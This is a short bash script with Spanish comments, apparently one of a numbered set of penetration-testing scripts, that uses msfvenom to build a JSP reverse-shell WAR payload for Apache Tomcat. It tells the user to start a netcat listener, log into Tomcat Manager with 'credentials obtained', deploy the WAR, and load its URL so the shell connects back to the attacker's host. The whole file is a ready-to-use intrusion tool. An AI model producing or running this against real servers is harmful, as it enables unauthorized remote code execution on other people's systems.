#!/bin/bash
# 10_tomcat_war_shell.sh
# Genera un payload reverse shell en formato WAR para Apache Tomcat
# (Tomcat Manager -> Deploy WAR).
#
# IMPORTANTE: pon primero un listener de netcat en otra terminal:
#   nc -lvnp <puerto_local>
#
# Uso:
#   ./10_tomcat_war_shell.sh <ip_atacante_o_pivote> <puerto_local> [nombre_salida]
#
# Ejemplo:
#   ./10_tomcat_war_shell.sh 10.0.4.4 4444 shell.war
#
# Tras generarlo:
#   1. Accede al Tomcat Manager (/manager/html) con las credenciales obtenidas.
#   2. En "WAR file to deploy", sube el archivo generado.
#   3. Visita http://<tomcat>:8080/<nombre_sin_extension>/ para activar la shell.

set -euo pipefail

LHOST="${1:?Uso: $0 <ip_atacante_o_pivote> <puerto_local> [nombre_salida]}"
LPORT="${2:?Falta el puerto local (LPORT)}"
OUTFILE="${3:-shell.war}"

echo "[*] Generando WAR reverse shell -> LHOST=${LHOST} LPORT=${LPORT}"
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f war -o "$OUTFILE"

echo
echo "[*] Generado: ${OUTFILE}"
echo "[*] Recuerda tener el listener activo: nc -lvnp ${LPORT}"
echo "[*] Sube ${OUTFILE} desde Tomcat Manager -> Deploy -> WAR file to deploy"
